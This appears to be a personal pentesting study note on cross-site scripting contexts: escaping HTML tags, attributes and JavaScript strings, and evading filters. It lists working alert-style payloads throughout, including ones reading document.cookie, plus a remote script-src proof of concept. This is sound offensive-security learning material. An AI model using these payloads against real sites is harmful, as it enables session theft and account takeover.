# XSS Contexts
- When testing for reflected/stored XSS, identify the XSS context.
	- Location where attacker-controlled data appears
	- Any input validation/processing being performed on the data...

## XSS between HTML tags
- Try to escape out of the tags of HTML elements and inject new elements for XSS

Example: escaping the `<option>` and `<select>` elements
```
</option></select><script>alert(1)</script>
```

Example payloads: 
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)> 
```

- If there is a WAF blocking many tags and attributes, use the PortSwigger cheatsheet copy/paste buttons (or wordlists) to bruteforce and see which are valid.

![[698e1871efd05461c521cd8bc685e012-1.png]]

![[908951c28ac5a3dc1bfbd676e615694d-1.png]]

- If the app does not block custom HTML tags like `<x-foo>` there might be events that can trigger XSS. For example, with the `onfocus` attribute, end the URL with `#` to make the page focus on the object and execute the code.

```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```

## XSS in HTML tag attributes

### Example 1
- Might be able to terminate the attribute value, close the tag, and make new one.

![[0e065db7da0846f79172e2925314aa69-1.png]]

- But if angle brackets are blocked or encoded, normally can introduce a new attribute that creates a scriptable context (like an event handler). The example below tries to trigger with autofocus and adds x=" at the end to repair the following markup.

![[1a2013260763df13a39336162fe40cbe-1.png]]

Before injection:

![[51e9ab3e84f152614bc9f581baf48684-1.png]]

INJECT:

![[1930d05ee2375db22b9f78c5b2b85ef8-1.png]]

After injection:

![[0046d9496731e871d853fa271b334077-1.png]]

- Also, another example might not even have to escape the attribute if it already provides ability to execute code. For example, `href` supports `href="javascript:alert(1)"`

Before injection:

![[6be9b0149628ad6d324826958fe0f459-1.png]]

INJECT:

![[8ccf84f10718ac41762381e5e2925ca9-1.png]]

After injection:

![[82432092eb954af0fac2b5c1b35d7059-1.png]]

### Example 2
- Yet another example shows that, even with "unexploitable" tags like the canonical link tag, some social engineering goes a long way. The `accesskey` attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire.

Before injection: 

![[f4ce08f6c4b89c50a58adb25be970329-1.png]]

INJECT:

![[57482c4ac6f476643514516907b7517a-1.png]]

After injection:

![[a2fd64c826f13bbf81925b3ba472a795-1.png]]

(User will need to be tricked to press a certain combination of keys with "X")
- ALT+SHIFT+X
- CTRL+ALT+X
- ALT+X

### Example 3
- If there is a controlled `<script src="..."` tag somewhere (somewhat rare), you can inject `http://xss.rocks/xss.js` or `//xss.rocks/xss.js` as a PoC


## XSS into JavaScript
- If there is JavaScript code executed and the code uses some attacker-controlled string variable, some payloads can break out of the existing JavaScript script tags and allow other XSS to be performed. Note: This works because HTML parsing happens FIRST, then JavaScript executes within the `<script>` tags.

Before injection: 

![[e89fc9cfe29613c1f99001933a5ff4a1-1.png]]

INJECT:

![[017ea00c72cf29b8c91c99be550029a8-1.png]]

After injection:

![[113d823f9cb3d55f85168d81e75d53a7-1.png]]

- If the XSS context is inside a quoted string literal, it is possible to break out of the string and execute JS directly. Make sure to repair anything following the XSS context, because syntax errors stop the script from executing.
- ALSO, this might work in the context of function calls like below because it needs to "calculate the arithmetic" by evaluating `alert(1)`:

Context: 
```
<script>
somefunction(''-alert(1)-'');
</script>
```

Try: 
- `'-alert(document.domain)-'`
- `';alert(document.domain)//`

Before injection:

![[7347cea19d4a21e4b1ba1d274a2ad8e5-1.png]]

INJECT:

![[2ad19bfd9e0f117280d8d9b4c5e9f258-1.png]]

After injection:

![[fab5b2af1c5f646627fc7a906f6af67d-1.png]]

- If quotes are escaped with a backslash, but the backslashes themselves are not escaped, you can preemptively escape the backslash to escape the string:

Try: 
- `\';alert(1)//`

After injection: 

![[44ce0b83e192046674d02c5fea7ffaeb-1.png]]

- If quotes are escaped or blocked, you may be able to evade the filter by using HTML encoding.

Context: 
```
<a href="#" onclick="... var input='controllable data here'; ..."> 
```

Try: 
- `&apos;-alert(1)-&apos;`



## XSS in AngularJS sandbox

## XSS Obfuscation  
Take a look at cheatsheets (including PortSwigger's) online to find various workarounds.

For example: 
```
<img src=1 oNeRrOr=alert`1`>
```
The above works when the filter is case sensitive and does not realize backticks can be used in place of the parantheses for the `alert()`